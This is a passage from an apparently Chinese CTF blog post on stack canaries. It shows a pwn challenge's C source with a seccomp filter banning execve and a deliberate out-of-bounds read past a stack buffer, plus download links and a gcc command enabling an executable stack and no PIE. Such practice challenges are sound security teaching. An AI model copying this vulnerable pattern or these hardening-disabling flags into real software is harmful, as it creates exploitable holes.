class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx =seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>];</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;I&#x27;m Captain Nanhe\n&quot;</span>,<span class="number">18</span>);</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;Say some old spells to start the journey\n&quot;</span>,<span class="number">41</span>);</span><br><span class="line">    read(<span class="number">0</span>,a+<span class="number">0x38</span>,<span class="number">21</span>);</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov $1,%rax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %rax,%rdi\n\t&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目附件和libc文件链接:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/1bBsZuq9iKhBilwjkmVX9Mw?pwd=chen 提取码: chen </span><br><span class="line">链接: https://pan.baidu.com/s/1DXnWUdWdnshfChysdxjXuQ?pwd=chen 提取码: chen </span><br></pre></td></tr></table></figure>

<p>题目编译指令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -fstack-protector  -no-pie -z lazy -o test   a.c  -lseccomp</span><br></pre></td></tr></table></figure>

<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/02/18/VNCTF2023/">← Next VNCTF2023</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/02/15/axb-2019-fmt64/">axb_2019_fmt64 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>ChenBlog</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFcanary"><span class="toc-number">1.</span> <span class="toc-text">什么是canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">题目实例</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>